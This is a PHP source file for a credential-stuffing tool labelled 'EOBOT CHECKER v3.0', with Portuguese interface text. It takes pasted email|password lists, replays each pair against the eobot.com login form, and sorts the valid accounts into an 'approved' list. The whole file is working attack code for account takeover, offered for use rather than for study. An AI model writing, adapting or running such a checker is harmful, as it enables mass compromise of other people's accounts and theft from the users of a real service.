<?php 
include '../../dbc.php';
page_protect();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
<head>
	<!-- no cache headers -->
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Expires" content="-1" />
	<meta http-equiv="Cache-Control" content="no-cache" />
	<!-- end no cache headers -->
	<title>Technology Checker</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style>
			body
		{
			background-color: #FFD777;
			font-size: 9pt;
			font-family:Verdana;
			line-height:12pt;
			color: #FFFFFF;
		}
			body,td,th {
			color: #FFFFFF;
		}
		h2
		{
			color: #FFFFFF;
		}
		h1 {
			padding: 10px 15px;
			color: red;
		}

		.main-content {
				width: 70%; height: 380px;margin: auto; background: #FFFFFF;      border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 380px;      position: relative;
		}
		textarea, input {
				border-radius: 5px 5px 5px 5px;
		}
		input {
				height: 30px;width: 100px;text-align: center;o
		}
			
			
		.button {
			   
		}
		.submit-button
				{
						background: #FFD777;
						border:solid 1px #FFD777;
						border-radius:5px;
								-moz-border-radius: 5px;
								-webkit-border-radius: 5px;
						-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
						border-bottom: 1px solid rgba(0,0,0,0.25);
						position: relative;
						color:#FFF;
						display: inline-block;
						cursor:pointer;
						font-size:13px;
						padding:3px 8px;
						height: 30px;width: 120px;
				}
        .submit-button:hover {
        background:#82D051;border:solid 1px #86CC50;
        height: 30px;width: 120px;      }
 
		#show {
				width: 70%;margin: auto;padding: 10px 10px;
		}

		.business{
			font-weight:bold;
			color:yellow;
		}
		.premier{
			font-weight:bold;
			color:#00FF00;
		}
		.verified{
			font-weight:bold;
			color:#006DB0;
		}
		.fieldset{
			border: 1px dashed #FFFFFF;
			margin-top: 20px;
		}
		.tvmit_live{
			border: 1px dashed #FFFFFF;
			color:yellow;
			font-weight:bold;
		}
		.tvmit_die{
			border: 1px dashed #FFFFFF;
			color:red;
			font-weight:bold;
		}
		#result{
			display:none;
		}
	</style>
	<script type="text/javascript">
    function pushDie(str){
        document.getElementById('listDie').innerHTML += '<div>' + str + '</div>';
    }
    function pushLive(str){
        document.getElementById('listLive').innerHTML += '<div>' + str + '</div>';
    }
    function pushCant(str){
        document.getElementById('listCant').innerHTML += '<div>' + str + '</div>';
    }
	function mpFilter(){
			var listMails = window.document.frmMain.mp.value;
			var tmpMails = listMails.match(/([a-zA-Z0-9_\.\-])+\@([a-zA-Z0-9\-\.])+\.([a-zA-Z0-9]{2,4})(|\s)+\|(|\s)([a-zA-Z0-9_\.\-\@\#\$\%\^\&\*\(\)\+\`\!\?]{6,})/g);
			if(tmpMails) { 
				var gMails="";
				for(var i=0;i<tmpMails.length;i++) {
					gMails=gMails+tmpMails[i]+"\n";
				}
				window.document.frmMain.mp.value=gMails;
			}
			else {
				window.document.frmMain.mp.value="";
			}
		}
</script>
</head>
<?php
function curl($url,$post="",$header=false, $ref=false) {  
	$ch = curl_init();
	if($post) {
		curl_setopt($ch, CURLOPT_POST ,0);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	}
	curl_setopt($ch, CURLOPT_URL, $url); 
	 //   curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json; charset=utf-8'));   
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.35 (KHTML, like Gecko) Ubuntu/10.10 Chromium/13.0.764.0 Chrome/13.0.764.0 Safari/534.35"); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); 
	if($ref) { 
        curl_setopt($ch, CURLOPT_REFERER, $ref);
    }
	curl_setopt($ch, CURLOPT_HEADER,1); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
	$result = curl_exec($ch); 
	curl_close ($ch); 
	return $result;
}
function array_remove_empty($arr){
    $narr = array();
    while(list($key, $val) = each($arr)){
        if (is_array($val)){
            $val = array_remove_empty($val);
            // does the result array contain anything?
            if (count($val)!=0){
                // yes :-)
                $narr[$key] = trim($val);
            }
        }
        else {
            if (trim($val) != ""){
                $narr[$key] = trim($val);
            }
        }
    }
    unset($arr);
    return $narr;
}
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
function inStr($s,$as){ 
        $s=strtoupper($s); 
        if(!is_array($as)) $as=array($as); 
        for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true; 
        return false; 
} 

function xflush()
{
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
    if ($output_handler == 'ob_gzhandler') {
        return;
    }
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}

function pushDie($str)
{
    echo '<script type="text/javascript">pushDie(\'' . $str . '\');</script>';
    xflush();
}
function pushLive($str)
{
	echo '<script type="text/javascript">pushLive(\'' . $str . '\');</script>';
    xflush();
}
function pushCant($str)
{
    echo '<script type="text/javascript">pushCant(\'' . $str . '\');</script>';
    xflush();
}
if(isset($_POST['submit'])) {
	$mp = $_POST['mp'];
	$delim = $_POST['delim'];
	$mail = $_POST['mail'];
	$pwd = $_POST['pwd'];
}
?>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<body>
<h1 align="center" style="color:#fff;">EOBOT CHECKER v3.0</h1>
<form method="post" name="frmMain">
<div align="center"><textarea name="mp" cols="90" rows="10"><?php if(isset($mp)) echo $mp; else echo 'admin@admin.com|minhasenha';?></textarea><br />
<br />
<input type="submit" value="DETONAR" name="submit" onClick="mpFilter();" />
</div>
<br />
</form>
<?php
//
if(isset($_POST['submit'])){
?>

	<br>
    <br>
	<=============================TECHNOLOGY CHECKER v3.0=============================>
	<div>APROVADAS :</div>
    <div id="listLive"></div>
	<=============================TECHNOLOGY CHECKER v3.0=============================>
	<div>REPROVADAS:</div>
    <div id="listDie"></div>
	<=============================TECHNOLOGY CHECKER v3.0=============================>
	<!--<div>List Socks DIE|BLACKLIST:</div>
    <div id="listDie"></div>
    <hr /> -->
    <div>FALHA GRAVE!!:</div>
    <div id="listCant"></div>
    <hr />
	
<?php
	xflush();
	$mps = array_remove_empty(array_unique(explode("\n",trim($mp))));
	$total = count($mps);
	$live = $die = $cant = array();
	$checked = 0;
	foreach($mps AS $z => $mp){
		set_time_limit(0);
		$checked++;
		//$head = "Content-Type: application/json; charset=utf-8";
		$cookie = "kingbilly_".rand(100000, 999999).".txt";
		$xxxx = explode("|",$mp);
		$email = trim($xxxx[0]);
		$pass = trim($xxxx[1]);
			// check
			
			$url = "https://www.eobot.com/login";
			$var = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMjAzMDk3OTAwNg9kFgJmD2QWBAIBD2QWAgIEDxYCHgRUZXh0Bc0HPHNjcmlwdCBpZD0ic2lkMDAyMDAwMDA2NjY1OTExNjEwNiI%2BKGZ1bmN0aW9uKCkge2Z1bmN0aW9uIGFzeW5jX2xvYWQoKXtzLmlkPSJjaWQwMDIwMDAwMDY2NjU5MTE2MTA2IjtzLnNyYz0od2luZG93LmxvY2F0aW9uLmhyZWYuaW5kZXhPZignZmlsZTovLy8nKSA%2BIC0xID8gJ2h0dHA6JyA6ICcnKSArICcvL3N0LmNoYXRhbmdvLmNvbS9qcy9nei9lbWIuanMnO3Muc3R5bGUuY3NzVGV4dD0id2lkdGg6MjAwcHg7aGVpZ2h0OjUxNnB4OyI7cy5hc3luYz10cnVlO3MudGV4dD0neyJoYW5kbGUiOiJlb2JvdGVzIiwiYXJjaCI6ImpzIiwic3R5bGVzIjp7ImEiOiIxRjhDRTYiLCJiIjoxMDAsImMiOiIwMDAwMDAiLCJkIjoiMDAwMDAwIiwiayI6IjFGOENFNiIsImwiOiIxRjhDRTYiLCJtIjoiMUY4Q0U2IiwicSI6IjFGOENFNiIsInIiOjEwMCwidCI6MCwiYWIiOmZhbHNlLCJ1c3JpY29uIjowLCJwb3MiOiJiciIsImN2IjoxLCJjdmZudHN6IjoiMTNweCIsImN2YmciOiIxRjhDRTYiLCJjdmZnIjoiZmZmZmZmIiwiY3Z3IjoyMDAsImN2aCI6NDAsInN1cmwiOjB9fSc7dmFyIHNzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpO2ZvciAodmFyIGk9MCwgbD1zcy5sZW5ndGg7IGkgPCBsOyBpKyspe2lmIChzc1tpXS5pZD09J3NpZDAwMjAwMDAwNjY2NTkxMTYxMDYnKXtzc1tpXS5pZCArPSdfJztzc1tpXS5wYXJlbnROb2RlLmluc2VydEJlZm9yZShzLCBzc1tpXSk7YnJlYWs7fX19dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7aWYgKHMuYXN5bmM9PXVuZGVmaW5lZCl7aWYgKHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKSB7YWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsYXN5bmNfbG9hZCxmYWxzZSk7fWVsc2UgaWYgKHdpbmRvdy5hdHRhY2hFdmVudCkge2F0dGFjaEV2ZW50KCdvbmxvYWQnLGFzeW5jX2xvYWQpO319ZWxzZSB7YXN5bmNfbG9hZCgpO319KSgpOzwvc2NyaXB0PmQCAw9kFgJmD2QWAmYPZBYCZg9kFgICAQ9kFgICAQ9kFgYCAg9kFgICAQ9kFgICAw8PFgIfAAVRVGhlIGVtYWlsIGFuZC9vciBwYXNzd29yZCB5b3UgZW50ZXJlZCBpcyBpbmNvcnJlY3Qgb3IgdGhlIGFjY291bnQgZG9lcyBub3QgZXhpc3QuZGQCAw9kFgICAQ9kFgJmDw8WBB4HRW5hYmxlZGgeB1Zpc2libGVoZGQCBA9kFgICAQ9kFgJmDw9kFgQeC29ubW91c2VvdmVyBRd0aGlzLnN0eWxlLmNvbG9yPSdibHVlJx4Kb25tb3VzZW91dAUadGhpcy5zdHlsZS5jb2xvcj0nIzAwMDAwMCdkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBSdjdGwwMCRDb250ZW50UGxhY2VIb2xkZXIxJGNoa1JlbWVtYmVyTWWfqU0Wo3wcoY%2BOByhQPPYVnLlwTPhilBm6VYsqRy%2FAsw%3D%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAAXuVIO9Zbanx2Wa2MGIujZuV%2FW0gDAOkD%2BneJAATSx0O3jjswiyhm%2Bg6KodwobC%2FfOeBnLKC%2B6MRathr9Sn4K67sEuMZ1vGSFQdOl%2B6KbBw5CdkPdsZ6mcdNhhOfaVGL1lm15wlK7WidoFoyGO%2B2dqE&ctl00%24ContentPlaceHolder1%24txtEmail='.$email.'&ctl00%24ContentPlaceHolder1%24txtPassword='.$pass.'&ctl00%24ContentPlaceHolder1%24btnLogin=Log+In';
			$page = curl($url, $var, $cookie);
			$cpf = getStr($page,'id="memberDocument">','</span><br>');
			//echo "<textarea>".$page."</textarea>" ;
			if(inStr($page, 'Logout')){
				$xyz = "<b style=\"color:chartreuse\">Aprovada ==></b> $email | $pass | #TechnologyChecker";
				$live[] = "Live ==> $email | $pass";
				pushLive($xyz);
			} elseif(inStr($page, 'password you entered is incorrect or the account does not exist.')) {
				$xyz = "<b style=\"color:red\">Reprovada  ==></b> $email | $pass";
				$die[] = "Reprovada ==> $email | $pass";
				pushDie($xyz);
			} else {
				$xyz = "<b style=\"color:red\">Erro Grave!</b> | $email | $pass ";
				$cant[] = "Erro Grave! | $email | $pass";	
				pushCant($xyz);
			}
		@unlink("c/".$cookie);
		xflush();
	}
	xflush();
	echo "<center><h3>Aprovadas: " . count($live) . "</h3>";
}
?>
<center>Technology Checker V3.0</center>
</body>
</html>